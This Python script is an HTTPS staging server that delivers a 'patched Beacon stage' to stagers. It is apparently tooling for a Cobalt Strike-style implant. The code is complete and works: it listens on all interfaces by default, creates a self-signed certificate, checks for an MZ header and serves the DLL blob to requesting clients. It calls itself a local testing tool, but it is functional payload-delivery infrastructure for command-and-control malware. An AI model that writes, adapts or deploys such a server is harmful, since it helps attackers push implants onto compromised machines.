#!/usr/bin/env python3
"""Small HTTPS stage server for local stager testing."""

from __future__ import annotations

import argparse
import hashlib
import http.server
import os
import shutil
import ssl
import subprocess
import sys
from functools import partial
from pathlib import Path
from urllib.parse import urlsplit


class StageRequestHandler(http.server.SimpleHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "BeaconStageHTTPS/1.0"

    def end_headers(self) -> None:
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Pragma", "no-cache")
        super().end_headers()

    def do_GET(self) -> None:
        path = urlsplit(self.path).path
        if path == self.server.stage_uri:
            self._serve_stage(include_body=True)
            return
        super().do_GET()

    def do_HEAD(self) -> None:
        path = urlsplit(self.path).path
        if path == self.server.stage_uri:
            self._serve_stage(include_body=False)
            return
        super().do_HEAD()

    def _serve_stage(self, include_body: bool) -> None:
        stage_path: Path = self.server.stage_path
        try:
            size = stage_path.stat().st_size
        except FileNotFoundError:
            self.send_error(404, "stage file not found")
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(size))
        self.end_headers()

        if include_body:
            with stage_path.open("rb") as fp:
                shutil.copyfileobj(fp, self.wfile)

    def log_message(self, fmt: str, *args: object) -> None:
        sys.stdout.write("[%s] %s\n" % (self.log_date_time_string(), fmt % args))
        sys.stdout.flush()


class StageHTTPSServer(http.server.ThreadingHTTPServer):
    daemon_threads = True

    def __init__(
        self,
        server_address: tuple[str, int],
        request_handler: type[StageRequestHandler],
        *,
        stage_path: Path,
        stage_uri: str,
    ) -> None:
        super().__init__(server_address, request_handler)
        self.stage_path = stage_path
        self.stage_uri = stage_uri


def parse_args() -> argparse.Namespace:
    script_dir = Path(__file__).resolve().parent
    cert_dir = script_dir / "certs"

    parser = argparse.ArgumentParser(
        description="Serve a patched Beacon stage over HTTPS for stager testing."
    )
    parser.add_argument("--bind", default="0.0.0.0", help="bind address")
    parser.add_argument("--port", type=int, default=9999, help="HTTPS listen port")
    parser.add_argument("--root", type=Path, default=Path.cwd(), help="static file root")
    parser.add_argument("--stage", type=Path, required=True, help="stage file to serve")
    parser.add_argument(
        "--uri",
        help="request URI mapped to --stage; default is /<stage file name>",
    )
    parser.add_argument("--cert", type=Path, default=cert_dir / "server.crt", help="TLS certificate path")
    parser.add_argument("--key", type=Path, default=cert_dir / "server.key", help="TLS private key path")
    parser.add_argument("--cn", default="localhost", help="CN used if a self-signed certificate is generated")
    parser.add_argument(
        "--allow-non-mz",
        action="store_true",
        help="allow serving a stage that does not start with MZ",
    )
    return parser.parse_args()


def normalize_uri(uri: str | None, stage_path: Path) -> str:
    value = uri or f"/{stage_path.name}"
    if not value.startswith("/"):
        value = "/" + value
    return value


def ensure_stage(stage_path: Path, *, allow_non_mz: bool) -> tuple[int, str, str]:
    if not stage_path.is_file():
        raise SystemExit(f"[-] stage file not found: {stage_path}")

    data = stage_path.read_bytes()
    if not data:
        raise SystemExit(f"[-] stage file is empty: {stage_path}")
    if not allow_non_mz and data[:2] != b"MZ":
        raise SystemExit(
            f"[-] stage does not start with MZ: {stage_path}\n"
            "    This server expects the DOS-stub-patched Beacon DLL blob.\n"
            "    Use --allow-non-mz only if that is intentional."
        )

    digest = hashlib.sha256(data).hexdigest()
    prefix = data[:16].hex(" ").upper()
    return len(data), digest, prefix


def ensure_certificate(cert_path: Path, key_path: Path, cn: str) -> None:
    if cert_path.is_file() and key_path.is_file():
        return

    openssl = shutil.which("openssl")
    if not openssl:
        raise SystemExit(
            "[-] TLS certificate/key missing and openssl was not found.\n"
            f"    cert: {cert_path}\n"
            f"    key : {key_path}\n"
            "    Provide --cert/--key or install openssl."
        )

    cert_path.parent.mkdir(parents=True, exist_ok=True)
    key_path.parent.mkdir(parents=True, exist_ok=True)
    cmd = [
        openssl,
        "req",
        "-x509",
        "-nodes",
        "-newkey",
        "rsa:2048",
        "-sha256",
        "-days",
        "3650",
        "-keyout",
        str(key_path),
        "-out",
        str(cert_path),
        "-subj",
        f"/CN={cn}",
    ]
    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def main() -> int:
    args = parse_args()

    stage_path = args.stage.resolve()
    root = args.root.resolve()
    stage_uri = normalize_uri(args.uri, stage_path)

    size, digest, prefix = ensure_stage(stage_path, allow_non_mz=args.allow_non_mz)
    ensure_certificate(args.cert.resolve(), args.key.resolve(), args.cn)

    handler = partial(StageRequestHandler, directory=os.fspath(root))
    server = StageHTTPSServer(
        (args.bind, args.port),
        handler,
        stage_path=stage_path,
        stage_uri=stage_uri,
    )

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=args.cert.resolve(), keyfile=args.key.resolve())
    server.socket = context.wrap_socket(server.socket, server_side=True)

    print(f"[+] bind      : https://{args.bind}:{args.port}")
    print(f"[+] stage URI : {stage_uri}")
    print(f"[+] stage file: {stage_path}")
    print(f"[+] stage size: {size} bytes")
    print(f"[+] sha256    : {digest}")
    print(f"[+] prefix    : {prefix}")
    print(f"[+] root      : {root}")
    print("[+] press Ctrl+C to stop")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] stopped")
    finally:
        server.server_close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
